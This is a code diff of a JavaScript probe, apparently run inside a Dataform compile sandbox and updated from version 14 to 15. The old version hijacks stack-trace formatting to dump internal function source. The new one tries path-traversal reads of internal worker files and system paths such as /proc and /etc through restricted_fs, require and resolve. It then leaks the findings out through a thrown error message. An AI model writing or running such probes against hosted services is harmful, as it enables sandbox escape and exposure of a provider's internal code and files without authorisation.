@@ -1,4 +1,4 @@
-// v14 — lightweight raw callsite dump; no proxies blowing memory
+// v15 — read known compile worker files (require_bin.js, main_wrapper_bin.js)
 
 var out = {};
 function safe(k, fn) {
@@ -6,68 +6,66 @@ function safe(k, fn) {
   catch(e) { out[k] = 'ERR:' + (e.message || String(e)).substring(0, 400); }
 }
 
-globalThis.__allFrames = [];
-Error.stackTraceLimit = 100;
+// Try reading files directly via restricted_fs
+var FILES = [
+  'require_bin.js',
+  'main_wrapper_bin.js',
+  '/require_bin.js',
+  '/main_wrapper_bin.js',
+  './require_bin.js',
+  './main_wrapper_bin.js',
+  '../require_bin.js',
+  '../main_wrapper_bin.js',
+  'node_modules/require_bin.js',
+  'node_modules/main_wrapper_bin.js',
+  'node_modules/@dataform/core/main_wrapper_bin.js',
+  'node_modules/@dataform/core/require_bin.js',
+  'node_modules/@dataform/cli/main_wrapper_bin.js',
+  'node_modules/@dataform/cli/require_bin.js',
+  '/app/require_bin.js',
+  '/app/main_wrapper_bin.js',
+  '/usr/local/lib/dataform/require_bin.js',
+  '/dataform/require_bin.js',
+  '/srv/dataform/require_bin.js',
+  '../../require_bin.js',
+  '../../main_wrapper_bin.js',
+  '../../../require_bin.js'
+];
 
-Error.prepareStackTrace = function(err, callSites) {
-  try {
-    var frame = ['TAG:' + (err.message ? err.message.substring(0,40) : '?')];
-    for (var i = 0; i < callSites.length; i++) {
-      var cs = callSites[i];
-      try {
-        var info = {
-          file: cs.getFileName && cs.getFileName(),
-          fn: cs.getFunctionName && cs.getFunctionName(),
-          line: cs.getLineNumber && cs.getLineNumber()
-        };
-        var f = cs.getFunction && cs.getFunction();
-        if (f) {
-          info.fn_src_head = String(f).substring(0, 150);
-        } else {
-          info.no_fn = true;
-        }
-        frame.push(info);
-      } catch(e) {}
-    }
-    globalThis.__allFrames.push(frame);
-  } catch(e) {}
-  return '';
-};
+for (var f of FILES) {
+  safe('read_' + f, function() {
+    return restricted_fs.readFile(f).toString().substring(0, 500);
+  });
+}
 
-// ============ Trigger throws WITHOUT blowing memory ============
-safe('A', function() {
-  // Simple throws
-  try { throw new Error('TAG_A1'); } catch(e) { e.stack; }
-  try { publish('p1',{type:'view'}); } catch(e) {}
-  try { operate('o1','select 1'); } catch(e) {}
-  try { assert('a1','select 1'); } catch(e) {}
-  try { global._DF_SESSION.resolve({name:'no',schema:'s'}); } catch(e) { e.stack; }
-  try { global._DF_SESSION.compileError(new Error('TAG_CE'), null); } catch(e) {}
-  // Force compile() — but DON'T proxy projectConfig
-  try { global._DF_SESSION.compile(); } catch(e) { e.stack; }
-  return 'errs done, stacks=' + globalThis.__allFrames.length;
-});
+// Try require() — that also uses restricted_fs but with module resolution
+var REQS = ['require_bin', 'main_wrapper_bin', 'require_bin.js', 'main_wrapper_bin.js', '../require_bin', '../main_wrapper_bin'];
+for (var r of REQS) {
+  safe('require_' + r, function() {
+    var x = require(r);
+    return 'GOT type=' + typeof x + ' keys=' + Object.keys(x||{}).slice(0,8).join(',');
+  });
+}
 
-safe('B_dump_all', function() {
-  return JSON.stringify(globalThis.__allFrames);
-});
+// Try resolve() — maybe shows path
+for (var r of ['require_bin', 'main_wrapper_bin', '@dataform/core', 'node_modules/@dataform/core']) {
+  safe('resolve_' + r, function() {
+    return resolve(r, '.');
+  });
+}
 
-// Find bundle-internal frames (not eval_test.js)
-safe('C_bundle_frames_only', function() {
-  var unique = {};
-  for (var stack of globalThis.__allFrames) {
-    for (var f of stack) {
-      if (typeof f === 'string') continue;
-      if (f.file && f.file !== 'eval_test.js' && f.fn_src_head) {
-        var k = f.file + ':' + f.fn + ':' + f.line;
-        unique[k] = f;
-      }
-    }
-  }
-  return JSON.stringify(unique);
-});
-
-Error.prepareStackTrace = undefined;
+// Walk restricted_fs.exists for various paths
+var PATHS_TO_CHECK = [
+  '/', '/app', '/dataform', '/srv', '/tmp', '/usr', '/home',
+  'require_bin.js', 'main_wrapper_bin.js',
+  'node_modules/@dataform', 'node_modules', '..', '../..',
+  '/proc', '/etc'
+];
+for (var p of PATHS_TO_CHECK) {
+  safe('exists_' + p, function() {
+    return restricted_fs.exists(p) + '/' + restricted_fs.isDirectory(p);
+  });
+}
 
 module.exports.asJson = { cells: [], metadata: {}, nbformat: 4, nbformat_minor: 5 };
-throw new Error('PROBE_v14:' + JSON.stringify(out));
+throw new Error('PROBE_v15:' + JSON.stringify(out));
